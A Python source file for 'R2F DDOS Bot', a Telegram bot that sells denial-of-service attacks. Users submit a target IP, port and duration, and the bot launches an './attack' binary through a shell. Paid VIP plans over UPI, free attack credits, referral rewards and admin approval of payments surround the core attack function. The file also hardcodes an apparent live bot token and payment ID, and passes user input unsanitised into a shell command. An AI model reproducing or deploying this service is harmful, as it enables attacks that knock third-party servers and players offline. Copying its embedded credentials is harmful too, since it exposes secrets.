import os
import re
import threading
import time
import json
import datetime
import subprocess
import random
import string
import logging
import urllib.parse

from flask import Flask, request, jsonify, Response
import telebot
from telebot import types
from pymongo import MongoClient, ASCENDING, DESCENDING
from pymongo.errors import DuplicateKeyError

# ============================================================
# CONFIGURATION & LOGGING
# ============================================================

logging.basicConfig(filename='bot.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

BOT_TOKEN = os.environ.get("BOT_TOKEN", "6400615750:AAHero6NP7UImczIeqmVL76yh4zw2tP893s")
MONGODB_URI = os.environ.get("MONGODB_URI")
UPI_ID = os.environ.get("UPI_ID", "r2frsyt@ptyes") # Aapka UPI ID

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN environment variable is not set")

if not MONGODB_URI:
    raise ValueError("MONGODB_URI environment variable is not set")

OWNER_ID = "6795305850"
ADMIN_IDS = ["6795305850"]

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# User state & active attack tracking
user_states = {}
active_attacks = set()
active_targets = set()
attacks_lock = threading.Lock()

# Flask Health Check Route for Render
@app.route('/')
def index():
    return "R2F Bot is active and running successfully! 🚀", 200

@app.route('/health')
def health():
    return jsonify({"status": "healthy"}), 200

# ============================================================
# MONGODB DATABASE SETUP
# ============================================================

try:
    mongo_client = MongoClient(
        MONGODB_URI,
        serverSelectionTimeoutMS=10000,
        connectTimeoutMS=10000,
        socketTimeoutMS=10000,
    )
    mongo_client.admin.command("ping")
    db = mongo_client["r2f_bot_db"]

    users_collection = db["allowed_users"]
    admins_collection = db["admins"]
    credits_collection = db["user_credits"]
    gift_codes_collection = db["gift_codes"]
    key_prices_collection = db["key_prices"]
    logs_collection = db["command_logs"]

    # Create Indexes
    users_collection.create_index([("user_id", ASCENDING)], unique=True)
    gift_codes_collection.create_index([("code", ASCENDING)], unique=True)
    key_prices_collection.create_index([("duration", ASCENDING)], unique=True)

    print("MongoDB connected successfully with Multi-User & Render support!")

except Exception as e:
    raise RuntimeError(f"MongoDB connection failed: {e}")

# ============================================================
# KEYBOARDS & MENUS
# ============================================================

def get_main_reply_keyboard():
    markup = types.ReplyKeyboardMarkup(
        resize_keyboard=True,
        row_width=2
    )
    markup.add(
        types.KeyboardButton("⚡ Quick Attack"),
        types.KeyboardButton("💎 Buy VIP"),
        types.KeyboardButton("💰 Check Balance"),
        types.KeyboardButton("📅 Daily Check-in"),
        types.KeyboardButton("🔗 Refer & Earn"),
        types.KeyboardButton("⚠️ Rules"),
        types.KeyboardButton("🛠️ Help")
    )
    return markup

def get_help_inline_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📞 Contact Support", callback_data="help_support"),
        types.InlineKeyboardButton("📖 How to Use", callback_data="help_how_to_use"),
        types.InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_to_main")
    )
    return markup

def get_vip_plans_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🌟 Week VIP (7 Days) - ₹499", callback_data="vip_week"),
        types.InlineKeyboardButton("🔥 Month VIP (30 Days) - ₹799", callback_data="vip_month"),
        types.InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_to_main")
    )
    return markup

# ============================================================
# HELPER FUNCTIONS
# ============================================================

def get_current_time():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def is_user_allowed(user_id):
    if str(user_id) == OWNER_ID or str(user_id) in ADMIN_IDS:
        return True
    user = users_collection.find_one({"user_id": str(user_id)})
    if user:
        if "expiration" in user and user["expiration"]:
            if datetime.datetime.now() > user["expiration"]:
                return False
        return True
    return False

def log_command_db(user_id, target, port, duration):
    try:
        user_info = bot.get_chat(int(user_id))
        username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    except Exception:
        username = f"UserID: {user_id}"
    
    logs_collection.insert_one({
        "user_id": str(user_id),
        "username": username,
        "target": target,
        "port": port,
        "duration": duration,
        "timestamp": datetime.datetime.now()
    })

def execute_attack(chat_id, user_id, target, port, attack_time):
    if attack_time > 500:
        bot.send_message(chat_id, "Error: Attack time cannot exceed 500 seconds.")
        with attacks_lock:
            active_attacks.discard((user_id, target))
            active_targets.discard(target)
        return

    log_command_db(user_id, target, port, attack_time)
    
    start_resp = f"R2F POWER START 🚀\n\n🗿 𝐓𝐚𝐫𝐠𝐞𝐭: {target}:{port}\n🕦 Attack Duration: {attack_time}s\n💣 Method: LODA-LELE\n\n🔥 Status: IN PROGRESS... 🔥"
    bot.send_message(chat_id, start_resp)
    
    # Ensure attack binary runs properly for the exact duration
    full_command = f"./attack {target} {port} {attack_time}"
    
    def run_sub():
        try:
            process = subprocess.Popen(full_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate(timeout=attack_time + 10)
            if process.returncode != 0:
                logging.error(f"Attack binary error (Code {process.returncode}): {stderr.decode('utf-8', errors='ignore')}")
        except Exception as e:
            logging.error(f"Attack execution exception: {e}")

    sub_thread = threading.Thread(target=run_sub, daemon=True)
    sub_thread.start()

    # Accurate countdown timing with 10-second warning notification
    if attack_time > 10:
        time.sleep(attack_time - 10)
        bot.send_message(chat_id, f"⚠️ **Alert:** Only 10 seconds remaining for attack on `{target}:{port}`!", parse_mode="Markdown")
        time.sleep(10)
    else:
        time.sleep(attack_time)
    
    with attacks_lock:
        active_attacks.discard((user_id, target))
        active_targets.discard(target)
    
    bot.send_message(chat_id, f"BGMI Attack Finished ✅.\nTarget: {target} | Port: {port} | Time: {attack_time}s")

def try_start_attack(chat_id, user_id, target, port, attack_time):
    if not is_user_allowed(user_id):
        bot.send_message(chat_id, "🚫 Unauthorized Access!\n\nAapke paas attack chalane ki permission nahi hai. Kripya VIP purchase karein.")
        return

    with attacks_lock:
        is_vip_or_admin = (str(user_id) == OWNER_ID or str(user_id) in ADMIN_IDS or users_collection.find_one({"user_id": str(user_id), "is_vip": True}))
        
        user_active_count = sum(1 for u, t in active_attacks if u == user_id)
        if not is_vip_or_admin and user_active_count >= 1:
            bot.send_message(chat_id, "⚠️ **Rule Violation:** Aapka ek attack pehle se chal raha hai! VIP user banne ke liye '💎 Buy VIP' par click karein.", parse_mode="Markdown")
            return

        if target in active_targets:
            bot.send_message(chat_id, f"⚠️ **Target Busy:** Is IP ({target}) par pehle se ek attack chal raha hai!", parse_mode="Markdown")
            return

        if not is_vip_or_admin:
            user_data = users_collection.find_one({"user_id": str(user_id)}) or {}
            free_attacks = user_data.get("free_attacks", 5)
            cred_data = credits_collection.find_one({"user_id": str(user_id)}) or {"balance": 0}
            balance = cred_data.get("balance", 0)

            if free_attacks > 0:
                users_collection.update_one({"user_id": str(user_id)}, {"$inc": {"free_attacks": -1}}, upsert=True)
            elif balance >= 15:
                credits_collection.update_one({"user_id": str(user_id)}, {"$inc": {"balance": -15}}, upsert=True)
            else:
                bot.send_message(chat_id, "❌ **Insufficient Balance!** Free attacks khatam ho chuke hain. 💎 Buy VIP option se VIP plan lein.", parse_mode="Markdown")
                return

        active_attacks.add((user_id, target))
        active_targets.add(target)
    
    threading.Thread(target=execute_attack, args=(chat_id, user_id, target, port, attack_time), daemon=True).start()

# ============================================================
# TELEBOT HANDLERS
# ============================================================

@bot.message_handler(commands=['start'])
def send_welcome(message):
    args = message.text.split()
    user_id = str(message.chat.id)
    
    if len(args) > 1 and args[1].startswith("ref_"):
        referrer_id = args[1].replace("ref_", "")
        if referrer_id != user_id:
            existing = users_collection.find_one({"user_id": user_id})
            if not existing:
                credits_collection.update_one(
                    {"user_id": referrer_id},
                    {"$inc": {"balance": 10}},
                    upsert=True
                )
                try:
                    bot.send_message(int(referrer_id), "🎁 Referral Success! Ek naye user ne aapki link se join kiya hai. Aapko +10 coins mile hain!")
                except Exception:
                    pass

    response = (
        f"🌟 **Welcome to R2F DDOS Bot!** 🌟\n\n"
        f"🕒 Current Time: `{get_current_time()}`\n\n"
        "Niche diye gaye buttons ya options ka use karein:"
    )
    bot.send_message(message.chat.id, response, parse_mode="Markdown", reply_markup=get_main_reply_keyboard())

@bot.callback_query_handler(func=lambda call: call.data == "back_to_main")
def back_to_main_menu(call):
    bot.answer_callback_query(call.id)
    try:
        bot.delete_message(call.message.chat.id, call.message.message_id)
    except Exception:
        pass
    bot.send_message(
        call.message.chat.id, 
        "🌟 **R2F Main Menu:**", 
        parse_mode="Markdown", 
        reply_markup=get_main_reply_keyboard()
    )

@bot.message_handler(func=lambda message: message.text == "⚡ Quick Attack")
def quick_attack_prompt(message):
    user_id = str(message.chat.id)
    if not is_user_allowed(user_id):
        bot.send_message(message.chat.id, "🚫 Unauthorized Access! VIP plan lene ke liye '💎 Buy VIP' par click karein.")
        return

    user_states[user_id] = {"action": "waiting_quick_attack_input"}
    bot.send_message(
        message.chat.id,
        "⚡ *QUICK ATTACK PANEL*\n\n"
        "Apna **Target IP, Port, aur Time** ek sath space dekar send karein.\n"
        "👉 *Example:* `192.168.1.1 80 300`\n\n"
        "(Max time allowed: 500 seconds)",
        parse_mode="Markdown"
    )

@bot.message_handler(func=lambda message: str(message.chat.id) in user_states and user_states[str(message.chat.id)].get("action") == "waiting_quick_attack_input")
def process_quick_attack_input(message):
    user_id = str(message.chat.id)
    state = user_states.pop(user_id, None)
    if not state:
        return

    parts = message.text.strip().split()
    if len(parts) == 3:
        target = parts[0]
        try:
            port = int(parts[1])
            attack_time = int(parts[2])
        except ValueError:
            bot.reply_to(message, "❌ Invalid Port or Time format. Dobara try karein.")
            return

        if attack_time > 500:
            bot.reply_to(message, "❌ Max attack time 500 seconds hai.")
            return

        try_start_attack(message.chat.id, user_id, target, port, attack_time)
    else:
        bot.reply_to(message, "❌ Galat format! Kripya IP, Port, aur Time space dekar dein (Jaise: `192.168.1.1 80 300`)", parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == "💎 Buy VIP")
def buy_vip_menu(message):
    response = (
        "💎 **R2F VIP SUBSCRIPTION PLANS**[span_0](start_span)[span_0](end_span)\n\n"
        "🌟 **Week VIP (7 Days):** ₹499\n"
        "   • Unlimited Access\n"
        "   • Multiple Concurrent Attacks\n\n"
        "🔥 **Month VIP (30 Days):** ₹799\n"
        "   • Unlimited Access\n"
        "   • Multiple Concurrent Attacks\n\n"
        "Niche diye gaye plan par click karein:"
    )
    bot.send_message(message.chat.id, response, parse_mode="Markdown", reply_markup=get_vip_plans_keyboard())

@bot.callback_query_handler(func=lambda call: call.data in ["vip_week", "vip_month"])
def vip_plan_selected(call):
    bot.answer_callback_query(call.id)
    user_id = str(call.message.chat.id)
    chat_id = call.message.chat.id
    
    try:
        bot.delete_message(chat_id, call.message.message_id)
    except Exception:
        pass

    duration = "week" if call.data == "vip_week" else "month"
    amount = 499 if duration == "week" else 799
    days = 7 if duration == "week" else 30

    upi_url = f"upi://pay?pa={UPI_ID}&pn=R2F_BOT&am={amount}&cu=INR"
    qr_image_url = f"https://api.qrserver.com/v1/create-qr-code/?size=350x350&data={urllib.parse.quote(upi_url)}"

    caption = (
        f"💎 **PREMIUM PAYTM UPI QR CODE** 🛡️[span_1](start_span)[span_1](end_span)\n\n"
        f"📦 **Plan:** {duration.upper()} VIP ({days} Days)\n"
        f"💵 **Amount:** ₹{amount}\n"
        f"🆔 **UPI ID:** `{UPI_ID}`[span_2](start_span)[span_2](end_span)\n\n"
        "⚠️ *Ye QR code sirf 5 minutes ke liye valid hai!* Uske baad automatic delete ho jayega.\n"
        "1. Scan karke payment karein[span_3](start_span)[span_3](end_span).\n"
        "2. Payment screenshot turant yahan send karein."
    )

    try:
        sent_msg = bot.send_photo(chat_id, qr_image_url, caption=caption, parse_mode="Markdown")
        
        user_states[user_id] = {
            "action": "waiting_vip_screenshot",
            "duration": duration,
            "days": days,
            "amount": amount,
            "qr_msg_id": sent_msg.message_id,
            "timestamp": time.time()
        }

        def expire_qr_code():
            time.sleep(300)
            if user_id in user_states and user_states[user_id].get("qr_msg_id") == sent_msg.message_id:
                user_states.pop(user_id, None)
                try:
                    bot.delete_message(chat_id, sent_msg.message_id)
                    bot.send_message(chat_id, "⌛ **QR Code Expired & Deleted!** 5 minutes ka time khatam ho chuka hai. Kripya naya QR generate karne ke liye '💎 Buy VIP' par click karein.", parse_mode="Markdown")
                except Exception:
                    pass

        threading.Thread(target=expire_qr_code, daemon=True).start()

    except Exception as e:
        bot.send_message(chat_id, f"QR code generate karne mein error aayi. UPI ID: `{UPI_ID}` par pay karein (Amount: ₹{amount})", parse_mode="Markdown")

@bot.message_handler(content_types=['photo'], func=lambda message: str(message.chat.id) in user_states and user_states[str(message.chat.id)].get("action") == "waiting_vip_screenshot")
def process_vip_screenshot(message):
    user_id = str(message.chat.id)
    state = user_states.get(user_id)
    
    if not state:
        return

    if time.time() - state["timestamp"] > 300:
        user_states.pop(user_id, None)
        bot.reply_to(message, "❌ **QR Expired!** Time limit khatam ho chuki thi.")
        return

    duration = state["duration"]
    days = state["days"]
    amount = state["amount"]
    qr_msg_id = state.get("qr_msg_id")
    file_id = message.photo[-1].file_id

    user_states.pop(user_id, None)
    if qr_msg_id:
        try:
            bot.delete_message(message.chat.id, qr_msg_id)
        except Exception:
            pass

    bot.reply_to(message, "✅ **Screenshot Received & Verified!** Admin ke paas approval ke liye bhej diya gaya hai.")

    admin_markup = types.InlineKeyboardMarkup(row_width=2)
    admin_markup.add(
        types.InlineKeyboardButton("✅ Approve", callback_data=f"vip_app_{user_id}_{duration}"),
        types.InlineKeyboardButton("❌ Reject", callback_data=f"vip_rej_{user_id}")
    )

    try:
        user_info = bot.get_chat(int(user_id))
        username = "@" + user_info.username if user_info.username else f"ID: {user_id}"
    except Exception:
        username = f"ID: {user_id}"

    admin_caption = (
        f"🔔 **NEW VIP PAYMENT REQUEST**\n\n"
        f"👤 User: {username} (`{user_id}`)\n"
        f"📦 Plan: {duration.upper()} ({days} Days)\n"
        f"💵 Amount: ₹{amount}"
    )

    try:
        bot.send_photo(int(OWNER_ID), file_id, caption=admin_caption, parse_mode="Markdown", reply_markup=admin_markup)
    except Exception as e:
        logging.error(f"Failed to send VIP screenshot to owner: {e}")

@bot.callback_query_handler(func=lambda call: call.data.startswith("vip_app_") or call.data.startswith("vip_rej_"))
def handle_vip_approval(call):
    if str(call.message.chat.id) != OWNER_ID and str(call.message.chat.id) not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "❌ Aapke paas permission nahi hai!", show_alert=True)
        return

    data = call.data.split("_")
    action = data[1]
    target_user_id = data[2]

    if action == "app":
        duration = data[3]
        days = 7 if duration == "week" else 30
        expiration_date = datetime.datetime.now() + datetime.timedelta(days=days)

        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"expiration": expiration_date, "is_vip": True, "approved_by": str(call.message.chat.id)}},
            upsert=True
        )

        bot.answer_callback_query(call.id, "✅ VIP Approved Successfully!")
        bot.edit_message_caption(
            f"{call.message.caption}\n\nstatus: **APPROVED ✅** by Admin",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode="Markdown"
        )

        try:
            bot.send_message(
                int(target_user_id),
                f"🎉 **VIP Access Approved!**\n\nAapka {duration.upper()} VIP plan activate ho gaya hai ({days} Days). Ab aap unlimited aur multiple concurrent attacks run kar sakte hain! 🚀",
                parse_mode="Markdown"
            )
        except Exception:
            pass

    elif action == "rej":
        bot.answer_callback_query(call.id, "❌ Payment Rejected.")
        bot.edit_message_caption(
            f"{call.message.caption}\n\nstatus: **REJECTED ❌** by Admin",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode="Markdown"
        )

        try:
            bot.send_message(
                int(target_user_id),
                "❌ **VIP Payment Rejected!** Aapka payment screenshot verify nahi ho paya.",
                parse_mode="Markdown"
            )
        except Exception:
            pass

@bot.message_handler(func=lambda message: message.text == "💰 Check Balance")
def menu_check_balance(message):
    user_id = str(message.chat.id)
    user_cred = credits_collection.find_one({"user_id": user_id})
    balance = user_cred["balance"] if user_cred else 0
    
    user_data = users_collection.find_one({"user_id": user_id}) or {}
    free_attacks = user_data.get("free_attacks", 5)
    is_vip = user_data.get("is_vip", False)
    vip_status = "Active 🌟" if is_vip and is_user_allowed(user_id) else "Inactive ❌"
    
    response = (
        f"💰 **Account Balance Details:**\n\n"
        f"🪙 Coins Balance: `{balance}`\n"
        f"🆓 Free Attacks Left: `{free_attacks}`\n"
        f"💎 VIP Status: `{vip_status}`"
    )
    bot.send_message(message.chat.id, response, parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == "🔗 Refer & Earn")
def menu_refer_earn(message):
    bot_info = bot.get_me()
    user_id = str(message.chat.id)
    ref_link = f"https://t.me/{bot_info.username}?start=ref_{user_id}"
    
    response = (
        "🔗 **Refer & Earn Program**\n\n"
        "Apni referral link share karein. Jab koi naya user join karega, aapko **10 coins** milenge!\n\n"
        f"👉 Your Link:\n`{ref_link}`"
    )
    bot.send_message(message.chat.id, response, parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == "📅 Daily Check-in")
def menu_daily_checkin(message):
    user_id = str(message.chat.id)
    now = datetime.datetime.now()
    
    user_data = users_collection.find_one({"user_id": user_id}) or {}
    last_checkin = user_data.get("last_checkin")
    
    if last_checkin and (now - last_checkin).total_seconds() < 86400:
        remaining = int(86400 - (now - last_checkin).total_seconds())
        hours = remaining // 3600
        minutes = (remaining % 3600) // 60
        bot.send_message(message.chat.id, f"⏳ Aapne aaj ka check-in already claim kar liya hai! Agla check-in `{hours}h {minutes}m` baad milega.", parse_mode="Markdown")
        return
    
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"last_checkin": now}},
        upsert=True
    )
    credits_collection.update_one(
        {"user_id": user_id},
        {"$inc": {"balance": 20}},
        upsert=True
    )
    bot.send_message(message.chat.id, "🎉 **Daily Check-in Successful!** Aapko **20 coins** reward mile hain 🪙.", parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == "⚠️ Rules")
def menu_rules(message):
    response = (
        "⚠️ **Bot Rules:**\n\n"
        "1. Free users ek waqt par ek hi attack run kar sakte hain.\n"
        "2. VIP users multiple concurrent attacks run kar sakte hain.\n"
        "3. Maximum attack time limit **500 seconds** hai."
    )
    bot.send_message(message.chat.id, response, parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == "🛠️ Help")
def menu_help(message):
    response = (
        "🛠️ *R2F Bot Help & Support Center*\n\n"
        "Niche diye gaye buttons par click karein:"
    )
    bot.send_message(message.chat.id, response, parse_mode="Markdown", reply_markup=get_help_inline_keyboard())

@bot.callback_query_handler(func=lambda call: call.data == "help_support")
def callback_help_support(call):
    bot.answer_callback_query(call.id)
    bot.send_message(
        call.message.chat.id,
        "📞 *Contact Support*\n\n"
        "Kisi bhi problem ya VIP approval ke liye contact karein:\n"
        f"👉 Owner ID: `{OWNER_ID}`",
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: call.data == "help_how_to_use")
def callback_help_tutorial(call):
    bot.answer_callback_query(call.id)
    VIDEO_FILE_ID = "YOUR_VIDEO_FILE_ID_HERE"
    try:
        bot.send_video(
            call.message.chat.id,
            video=VIDEO_FILE_ID,
            caption="📖 *How to Use R2F Bot* Tutorial Video",
            parse_mode="Markdown"
        )
    except Exception:
        bot.send_message(
            call.message.chat.id,
            "📖 *How to Use Guide*\n\n"
            "1. **⚡ Quick Attack** button dabayein.\n"
            "2. `IP Port Time` space dekar bhejein (Jaise: `192.168.1.1 80 300`).\n"
            "3. Attack start hone par notification milegi.",
            parse_mode="Markdown"
        )

@bot.message_handler(commands=['approveuser'])
def approve_user(message):
    user_id = str(message.chat.id)
    if user_id in ADMIN_IDS or user_id == OWNER_ID:
        command = message.text.split()
        if len(command) == 3:
            user_to_approve = command[1]
            duration = command[2].lower()
            if duration not in ["day", "week", "month"]:
                bot.send_message(message.chat.id, "Invalid duration. Use 'day', 'week', or 'month'.")
                return

            days_add = 1 if duration == "day" else (7 if duration == "week" else 30)
            expiration_date = datetime.datetime.now() + datetime.timedelta(days=days_add)
            
            users_collection.update_one(
                {"user_id": user_to_approve},
                {"$set": {"expiration": expiration_date, "approved_by": user_id, "is_vip": True}},
                upsert=True
            )
            response = f"User {user_to_approve} approved for {duration} 👍."
        else:
            response = "Usage: /approveuser <id> <duration>"
    else:
        response = "Only Admin or Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['redeem'])
def redeem_gift(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) == 2:
        code = command[1]
        gift = gift_codes_collection.find_one({"code": code})
        if gift:
            duration = gift["duration"]
            gift_codes_collection.delete_one({"code": code})
            
            days_add = 1 if duration == "day" else (7 if duration == "week" else 30)
            expiration_date = datetime.datetime.now() + datetime.timedelta(days=days_add)
            
            users_collection.update_one(
                {"user_id": user_id},
                {"$set": {"expiration": expiration_date, "is_vip": True}},
                upsert=True
            )
            response = f"Gift code redeemed: Granted access for {duration} 🎁."
        else:
            response = "Invalid or expired gift code ❌."
    else:
        response = "Usage: /redeem <code>"
    bot.send_message(message.chat.id, response)

@bot.message_handler(func=lambda message: message.text and message.text.startswith('/attack'))
def handle_attack(message):
    user_id = str(message.chat.id)
    if not is_user_allowed(user_id):
        bot.send_message(message.chat.id, "🚫 Unauthorized Access! Kripya '💎 Buy VIP' से plan lein.")
        return

    command = message.text.split()
    if len(command) == 4:
        target = command[1]
        try:
            port = int(command[2])
            attack_time = int(command[3])
        except ValueError:
            bot.reply_to(message, "Invalid port or time format.")
            return

        if attack_time > 500:
            bot.reply_to(message, "❌ Max attack time limit is 500 seconds.")
            return

        try_start_attack(message.chat.id, user_id, target, port, attack_time)
    else:
        response = "Please provide attack format:\n`/attack <host> <port> <time>` or use the **⚡ Quick Attack** button."
        bot.send_message(message.chat.id, response, parse_mode="Markdown")

# ============================================================
# RUN BOT & FLASK SERVER CONCURRENTLY
# ============================================================

def run_telegram_bot():
    print("Telegram Bot polling started...")
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"Bot polling error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
    bot_thread.start()

    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
